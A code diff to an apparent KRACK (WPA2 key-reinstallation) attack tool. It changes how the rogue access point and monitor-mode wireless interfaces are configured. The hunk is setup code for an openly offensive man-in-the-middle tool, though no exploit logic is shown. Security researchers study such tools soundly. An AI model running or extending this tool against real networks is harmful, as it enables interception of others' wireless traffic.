@@ -770,22 +770,13 @@ class KRAckAttack():
 		# effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
 		log(STATUS, "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")
 
-		# 1. Remove unused virtual interfaces
-		if self.nic_rogue_mon is None:
-			subprocess.call(["iw", self.nic_rogue_ap + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-
 		# 2. Configure monitor mode on interfaces
 		subprocess.check_output(["ifconfig", self.nic_real_mon, "down"])
 		subprocess.check_output(["iwconfig", self.nic_real_mon, "mode", "monitor"])
-		if self.nic_rogue_mon is None:
-			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
-			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "managed"])
-			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
-			time.sleep(0.2)
-		else: 
-			subprocess.check_output(["ifconfig", self.nic_rogue_ap, "down"])
-			subprocess.check_output(["iwconfig", self.nic_rogue_ap, "mode", "managed"])
-			subprocess.check_output(["ifconfig", self.nic_rogue_ap, "up"])
+		
+		subprocess.check_output(["ifconfig", self.nic_rogue_ap, "down"])
+		subprocess.check_output(["iwconfig", self.nic_rogue_ap, "mode", "managed"])
+		subprocess.check_output(["ifconfig", self.nic_rogue_ap, "up"])
 
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])
 		subprocess.check_output(["iwconfig", self.nic_rogue_mon, "mode", "monitor"])
